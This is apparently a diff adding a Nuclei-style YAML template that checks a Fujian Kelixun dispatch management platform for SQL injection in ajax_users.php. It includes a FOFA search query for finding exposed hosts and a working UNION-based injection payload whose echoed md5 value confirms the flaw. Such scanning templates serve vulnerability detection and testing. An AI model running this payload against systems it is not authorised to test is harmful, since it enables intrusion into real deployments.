@@ -1,0 +1,31 @@
+id: zhihui-ajax-users-sqli
+
+info:
+  name: 福建科立讯通信 指挥调度管理平台 ajax_users.php SQL 注入漏洞
+  author: g3m
+  severity: high
+  metadata: 
+    fofa-query: body="app/structure/departments.php"
+  
+
+http:
+  - raw:
+    - |
+      @timeout 25s
+      POST /app/ext/ajax_users.php HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
+      Content-Type: application/x-www-form-urlencoded
+
+      dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL-- -
+
+    matchers-condition: and
+    matchers: 
+      - type: word
+        words:
+          - "~c4ca4238a0b923820dcc509a6f75849b~"
+        part: body
+
+      - type: status
+        status:
+          - 200
